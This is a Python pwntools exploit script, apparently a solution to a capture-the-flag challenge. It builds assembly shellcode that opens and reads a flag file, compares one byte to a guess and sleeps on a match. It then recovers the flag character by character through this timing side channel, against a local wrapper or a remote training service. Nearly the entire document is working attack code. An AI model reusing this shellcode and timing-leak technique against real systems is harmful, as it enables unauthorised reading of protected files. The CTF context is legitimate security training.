from pwn import *

COMMANDS = """
"""

# Shellcode that compares flag characters and uses nanosleep for timing
def create_timing_shellcode(position, char):
    # Open /challenge/flag
    shellcode = asm('''
        /* Push /challenge/flag */
        mov rax, 0x00000067616c662f
        push rax
        mov rax, 0x656c6c656e616863
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        /* Read flag into stack */
        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        /* Check character at specific position */
        cmp byte ptr [rsi + {}], {}
        jne skip
        
        /* If character matches, call nanosleep to increase time */
        xor rdi, rdi
        mov rsi, rsp
        mov qword ptr [rsi], 1      /* tv_sec = 1 */
        mov qword ptr [rsi+8], 0    /* tv_nsec = 0 */
        mov rax, 35                 /* nanosleep syscall */
        syscall
        
    skip:
        /* Exit */
        xor rdi, rdi
        mov rax, 60
        syscall
    '''.format(position, char), arch='amd64')
    
    return shellcode.ljust(1024, b'\x90')

def brute_force_flag():
    flag = ""
    position = 0
    
    while True:
        found_char = False
        
        # Try all possible characters
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!":
            if args.REMOTE:
                p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
            else:
                p = process(["python3", "wrapper.py"])  # Or however you run wrapper locally
            
            try:
                # Get banner
                p.recvuntil(b"Shellcode: ")
                
                # Send shellcode for this character
                shellcode = create_timing_shellcode(position, ord(char))
                p.send(shellcode)
                
                # Get timing result
                response = p.recvuntil(b"Time: ")
                timing_line = p.recvline().decode().strip()
                time_taken = float(timing_line)
                
                p.close()
                
                # If time is significantly longer, we found the character
                if time_taken > 1.0:  # Adjust threshold based on testing
                    flag += char
                    print(f"Position {position}: '{char}' -> Flag so far: {flag}")
                    found_char = True
                    position += 1
                    break
                    
            except Exception as e:
                p.close()
                continue
        
        if not found_char:
            print("No character found for position", position)
            break
            
        if flag.endswith('}'):
            print(f"Complete flag: {flag}")
            break
    
    return flag

if __name__ == "__main__":
    flag = brute_force_flag()
    print(f"Final flag: {flag}")